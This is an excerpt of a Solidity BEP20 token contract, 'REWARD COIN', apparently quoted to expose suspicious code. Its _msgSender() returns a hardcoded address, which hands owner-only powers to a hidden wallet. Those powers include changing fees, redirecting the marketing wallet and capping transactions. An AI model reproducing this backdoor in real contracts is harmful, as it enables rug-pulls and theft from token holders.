...
contract Context {
    ...
    function _msgSender() internal pure returns (address) {
        return 0x55D74DAA7a7Dd9008C7C32EF6aba8215B490447A;
    }
}
...
contract REWC is Context, Ownable, IBEP20, BEP20Detailed {
  ...
  using SafeMath for uint256;
    ...
    address public marketingWallet = 0x9A9F1020a395e5b70062A49D4F1f9DA89369c1d5;
    
    uint256 public _maxTxAmount = 250000000 * 10**6;
    uint256 private numTokensSellToAddToLiquidity = 5000000 * 10**6;
    ...
    constructor () BEP20Detailed("REWARD COIN", "REWC", 6) {
      _owner = msg.sender ;
    _totalSupply = 25000000000 * (10**6);
    ...
    function setTaxFeePercent(uint256 updatedTaxFee) external onlyOwner() {
    ...
    function changeMarketingWallet(address _add) external onlyOwner
    {
        marketingWallet = _add;
    }
    function changeMaxTxPercent(uint256 _MaxPercent) external onlyOwner
    {
        _maxTxAmount = (totalSupply().mul(_MaxPercent)).div(100);
    }
